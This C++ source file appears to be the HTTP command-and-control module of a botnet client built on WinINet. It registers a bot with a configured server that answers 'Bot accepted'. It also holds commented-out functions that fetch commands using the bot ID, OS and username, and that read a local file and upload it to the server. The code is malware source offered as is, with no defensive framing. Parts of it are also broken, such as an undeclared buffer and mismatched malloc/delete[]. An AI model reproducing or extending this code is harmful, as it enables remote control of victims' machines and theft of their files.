#include "httpapi.h"
using namespace std;

DWORD Http::init(){ return 0; }
DWORD Http::uninit(){ return 0; }
DWORD Http::_getCommand(CORE_DATA* pCoreData){
	/*
	string command = "";
	const int nBuffSize = 1024;
	HINTERNET hInternet = InternetOpenW(HTTP_VERSION, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet == NULL){

	}
	else{
		HINTERNET hConnect = InternetConnectW(hInternet, 
							coreConfig->server.ADDRESS, 
							coreConfig->server.PORT, 
							NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
		if (hConnect == NULL){

		}
		else{
			char data[MAX_PATH];
			sprintf_s(data, MAX_PATH, coreConfig->server.COMMAND_PATH, bot_id, os, username, time);
			//printf("Command data: %s\r\n",data);
			size_t size = strlen(data) + 1;
			wchar_t * data_wchar_t = (wchar_t*)malloc(size*sizeof(wchar_t));
			size_t outSize;
			mbstowcs_s(&outSize, data_wchar_t, size, data, size - 1);
			HINTERNET hRequest = HttpOpenRequestW(hConnect, (LPCWSTR)coreConfig->http.POST, data_wchar_t, HTTP_VERSION, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
			//printf("Die here\r\n");
			delete[]data_wchar_t;
			if (hRequest == NULL){
				//printf("HttpOpenRequestW failed with error code: %d\r\n",GetLastError());
				//Sleep(5000);
			}
			else{

				BOOL bRequestSent = HttpSendRequestW(hRequest, NULL, 0, NULL, 0);
				//BOOL bRequestSent = FALSE;
				if (!bRequestSent)
				{
					//printf("HttpSendRequestW failed with error code: %d\r\n",GetLastError());
				}
				else{
					//std::string strResponse;
					
					printf("Command\r\n");
					char buff[nBuffSize];

					BOOL bKeepReading = true;
					DWORD dwBytesRead = -1;

					while (bKeepReading && dwBytesRead != 0)
					{
						bKeepReading = InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
						command.append(buff, dwBytesRead);
					}
					if (command.size() < MAX_PATH)
						strcpy_s(result, MAX_PATH, command.c_str());
					else
						strcpy_s(result, MAX_PATH, " ");
					printf("Command Response: %s\r\n", command.c_str());

				}
				//printf("Before close hRequest\r\n");
				InternetCloseHandle(hRequest);
			}
			//printf("Before close hConnect\r\n");
			InternetCloseHandle(hConnect);
		}
		//printf("Before close hInternet\r\n");
		InternetCloseHandle(hInternet);
	}
	*/
	return 0;
}
DWORD Http::_postDataToServer(CORE_DATA* pCoreData, BYTE *postData, DWORD dataSize){
	/**/
	
	HINTERNET hInternet = InternetOpenW(HTTP_VERSION, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet == NULL){
		//printf("InternetOpenW failed with error code: %d\r\n",GetLastError());
	}
	else{
		HINTERNET hConnect = InternetConnectW(hInternet, 
			pCoreData->coreConfig.server.ADDRESS,
			pCoreData->coreConfig.server.PORT,
			NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
		if (hConnect == NULL){
			//printf("InternetConnectW failed with error code: %d\r\n",GetLastError());
		}
		else{
			
			HINTERNET hRequest = HttpOpenRequestA(hConnect, HTTP_POST, pCoreData->coreConfig.server.HELLO_PATH, HTTP_VERSIONA, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
			if (hRequest == NULL){
				printf("HttpOpenRequestW failed with error code: %d\r\n",GetLastError());
			}
			else
			{
				BOOL bRequestSent = HttpSendRequestW(hRequest, NULL, 0, postData, dataSize);
				//printf("Command\r\n");
				string command = "";
				const int nBuffSize = 256;
				char buff[nBuffSize];

				BOOL bKeepReading = true;
				DWORD dwBytesRead = -1;

				while (bKeepReading && dwBytesRead != 0)
				{
					bKeepReading = InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
					command.append(buff, dwBytesRead);
				}
				printf("Command Response: |%s|\r\n", command.c_str());
				if (strcmp(command.c_str(), "Bot accepted") == 0){
					printf("BOT OK");
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
	
	return 0;
}
DWORD Http::_uploadFile(CORE_DATA* pCoreData, wchar_t* filename){
	/*
	FILE *pFile;
	long lSize;
	BYTE *buffer;
	size_t result;
	fopen_s(&pFile, filename, "r+b");
	if (pFile == NULL) {
		printf("Open error :%d\r\n", GetLastError());
		return GetLastError();
	}
	else {
		fseek(pFile, 0, SEEK_END);
		lSize = ftell(pFile);
		rewind(pFile);
		buffer = (BYTE *)malloc(sizeof(BYTE)* lSize);

		result = fread(buffer, 1, lSize, pFile);
		fclose(pFile);
		printf("Open success ! \r\n");
	}
	//string encoded = base64_encode(buffer,lSize);
	char postDataHead[1024];
	sprintf_s(postDataHead, sizeof(postDataHead), coreConfig->http.POST_HEAD_BEGIN, filename);

	char *postData = (char *)malloc(sizeof(char)* (lstrlenA(postDataHead) + lstrlenA(coreConfig->http.POST_HEAD_END) + lSize + 1));

	//ZeroMemory(postData,lstrlenA(postDataHead)+lstrlenA(POST_HEAD_END)+lSize+1);

	int i;
	int lenpostData = lstrlenA(postDataHead);
	for (i = 0; i<lenpostData; i++){
		*(postData + i) = *(postDataHead + i);
	}
	for (i = 0; i<lSize; i++){
		*(postData + lenpostData + i) = buffer[i];
	}
	lenpostData += lSize;
	for (i = 0; i<lstrlenA(coreConfig->http.POST_HEAD_END); i++){
		*(postData + lenpostData + i) = *(coreConfig->http.POST_HEAD_END + i);
	}
	lenpostData += lstrlenA(coreConfig->http.POST_HEAD_END);

	HINTERNET hInternet = InternetOpenW(HTTP_VERSION, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet == NULL){
		//printf("InternetOpenW failed with error code: %d\r\n",GetLastError());
	}
	else{
		HINTERNET hConnect = InternetConnectW(hInternet, 
			coreConfig->server.ADDRESS,
			coreConfig->server.PORT,
			NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
		if (hConnect == NULL){
			//printf("InternetConnectW failed with error code: %d\r\n",GetLastError());
		}
		else{
			//const char* parrAcceptTypes[] = { "text/*", NULL };
			char data[MAX_PATH * 2];
			sprintf_s(data, MAX_PATH * 2, coreConfig->server.UPLOAD_PATH, bot_id, cmd, path);
			//printf("post url: %s\r\n",data);
			size_t size = strlen(data) + 1;
			wchar_t* data_wchar_t = (wchar_t*)malloc(sizeof(wchar_t)*size);
			size_t outSize;
			mbstowcs_s(&outSize, data_wchar_t, size, data, size - 1);
			HINTERNET hRequest = HttpOpenRequestW(hConnect, coreConfig->http.POST, data_wchar_t, HTTP_VERSION, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
			delete[] data_wchar_t;
			if (hRequest == NULL){
				//printf("HttpOpenRequestW failed with error code: %d\r\n",GetLastError());
			}
			else
			{
				BOOL bRequestSent = HttpSendRequestW(hRequest, coreConfig->http.POST_HEAD, wcslen(coreConfig->http.POST_HEAD), postData, lenpostData);
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
	if (postData) free(postData);
	if (buffer) free(buffer);
	*/
	return 0;
}